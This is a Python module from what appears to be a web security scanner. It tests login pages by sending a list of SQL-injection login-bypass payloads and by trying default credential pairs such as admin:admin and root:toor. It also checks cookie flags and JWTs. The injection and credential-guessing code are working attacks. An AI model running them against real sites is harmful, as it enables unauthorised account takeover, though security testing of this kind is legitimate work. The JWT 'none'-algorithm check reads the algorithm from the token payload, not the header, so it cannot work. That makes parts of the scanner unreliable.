import re
from urllib.parse import urlparse


JWT_REGEX = re.compile(r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+")
COMMON_CREDENTIALS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("root", "root"), ("root", "toor"),
    ("user", "user"), ("user", "password"), ("user", "123456"),
    ("test", "test"), ("guest", "guest"), ("admin", "letmein"),
    ("admin", "qwerty"), ("admin", "passw0rd"), ("administrator", "administrator"),
]

WEAK_COOKIE_FLAGS = ["secure", "httponly", "samesite"]

AUTH_ENDPOINTS = [
    "/login", "/login.php", "/signin", "/auth", "/api/login",
    "/admin", "/admin/login", "/wp-login.php", "/administrator",
    "/user/login", "/account/login", "/api/auth/login",
]

SQLI_AUTH_BYPASS_PAYLOADS = [
    "' OR '1'='1' --",
    "' OR 1=1#",
    "' OR '1'='1",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1 LIMIT 1 --",
    "' UNION SELECT 1,'admin','hash' --",
    "admin' OR '1'='1",
    "\" OR 1=1 --",
    "1' OR '1' = '1",
    "' OR 1=1--",
    "' OR 'x'='x",
    "' OR 1=1; --",
]

SQLI_AUTH_REDIRECT_PATHS = ["/dashboard", "/admin", "/home", "/panel", "/account", "/profile", "/user", "/backend"]


def _test_sqli_auth_bypass(engine, endpoint):
    engine._log("INFO", f"Testing SQLi-driven auth bypass on {endpoint}")
    results = []
    params = engine.extract_params()
    if not params:
        return results

    for param in params:
        baseline_resp = engine.request(endpoint, method="GET")
        if not baseline_resp:
            continue

        for payload in SQLI_AUTH_BYPASS_PAYLOADS:
            args = engine.build_request_args(param, payload)
            args["path"] = endpoint
            args["method"] = "POST"
            resp = engine.request(**args)
            if not resp:
                continue

            baseline_redirect = baseline_resp.status_code in (301, 302, 307, 308)
            injection_redirect = resp.status_code in (301, 302, 307, 308)

            if injection_redirect and not baseline_redirect:
                location = resp.headers.get("Location", "")
                for auth_path in SQLI_AUTH_REDIRECT_PATHS:
                    if auth_path in location:
                        engine._log("VULN", f"CRITICAL: SQLi Auth Bypass on {endpoint} param '{param}'")
                        engine._log("VULN", f"  Payload: {payload}")
                        engine._log("VULN", f"  Redirected to authenticated page: {location}")
                        results.append({
                            "check": "sqli_auth_bypass",
                            "endpoint": endpoint,
                            "parameter": param,
                            "payload": payload,
                            "detail": f"SQLi payload caused redirect to authenticated page {location}",
                            "severity": "critical",
                            "location": location,
                        })
                        break

            baseline_cookie = baseline_resp.headers.get("Set-Cookie", "")
            injection_cookie = resp.headers.get("Set-Cookie", "")
            if injection_cookie and injection_cookie != baseline_cookie:
                cookie_name = injection_cookie.split("=")[0] if "=" in injection_cookie else ""
                engine._log("VULN", f"CRITICAL: SQLi Auth Bypass via session cookie on {endpoint}")
                engine._log("VULN", f"  Payload: {payload}")
                engine._log("VULN", f"  New session cookie issued: {cookie_name}")
                results.append({
                    "check": "sqli_session_gain",
                    "endpoint": endpoint,
                    "parameter": param,
                    "payload": payload,
                    "detail": f"SQLi payload caused new session cookie: {cookie_name}",
                    "severity": "critical",
                    "cookie": injection_cookie[:120],
                })

    return results


def auth_check(engine):
    engine._log("INFO", f"Starting authentication security checks on {engine.target_url}")
    results = []

    parsed = urlparse(engine.target_url)
    base_domain = parsed.hostname or ""

    resp = engine.request("", method="GET")
    if resp:
        cookies = dict(resp.cookies)
        set_cookie_headers = resp.headers.get_all("Set-Cookie") if hasattr(resp.headers, "get_all") else []
        if not set_cookie_headers:
            sc = resp.headers.get("Set-Cookie", "")
            set_cookie_headers = [sc] if sc else []

        for cookie_header in set_cookie_headers:
            cookie_name = cookie_header.split("=")[0] if "=" in cookie_header else "unknown"
            flags_lower = cookie_header.lower()

            missing_flags = []
            for flag in WEAK_COOKIE_FLAGS:
                if flag not in flags_lower:
                    missing_flags.append(flag)

            if missing_flags:
                engine._log("WARN", f"Cookie '{cookie_name}' missing flags: {', '.join(missing_flags)}")
                results.append({
                    "check": "weak_cookie_flags",
                    "cookie": cookie_name,
                    "detail": f"Cookie missing: {', '.join(missing_flags)}",
                    "severity": "medium",
                    "current": cookie_header[:100],
                })

    for endpoint in AUTH_ENDPOINTS:
        ar = engine.request(endpoint)
        if ar and ar.status_code == 200:
            body = ar.text.lower()
            has_form = "password" in body and ("input" in body or "form" in body)
            if has_form:
                sqli_bypass_results = _test_sqli_auth_bypass(engine, endpoint)
                results.extend(sqli_bypass_results)

                for username, password in COMMON_CREDENTIALS:
                    login_resp = engine.request(endpoint, method="POST", data={
                        "username": username, "password": password,
                        "email": username, "user": username, "log": username,
                        "pwd": password,
                    })
                    if login_resp and login_resp.status_code == 302:
                        engine._log("VULN", f"Default credentials worked: {username}:{password} at {endpoint}")
                        results.append({
                            "check": "default_credentials",
                            "endpoint": endpoint,
                            "detail": f"Login succeeded with {username}:{password}",
                            "severity": "critical",
                            "credentials": f"{username}:{password}",
                        })
                        break

            if not results:
                resp_text = ar.text
                if "register" in resp_text.lower() or "signup" in resp_text.lower():
                    engine._log("WARN", f"Registration form found at {endpoint} (check for weak registration)")
                    results.append({
                        "check": "registration_available",
                        "endpoint": endpoint,
                        "detail": "User registration form detected",
                        "severity": "info",
                    })

    resp = engine.request("", method="GET")
    if resp:
        body = resp.text
        jwt_matches = JWT_REGEX.findall(body)
        for jwt in jwt_matches[:5]:
            import base64
            try:
                parts = jwt.split(".")
                if len(parts) == 3:
                    padding = 4 - len(parts[1]) % 4
                    if padding != 4:
                        parts[1] += "=" * padding
                    decoded = base64.urlsafe_b64decode(parts[1])
                    import json
                    payload = json.loads(decoded)
                    if payload.get("alg") == "none":
                        engine._log("VULN", f"JWT with 'none' algorithm found!")
                        results.append({
                            "check": "jwt_none_algorithm",
                            "detail": "JWT uses 'none' algorithm (bypass authentication)",
                            "severity": "critical",
                        })
                    if not payload.get("exp"):
                        engine._log("WARN", "JWT found without expiration")
                        results.append({
                            "check": "jwt_no_expiry",
                            "detail": "JWT token missing expiration claim",
                            "severity": "medium",
                        })
            except Exception:
                pass

    engine.results["auth"] = results
    engine._log("INFO", f"Authentication checks complete. Found {len(results)} issues.")
    return results
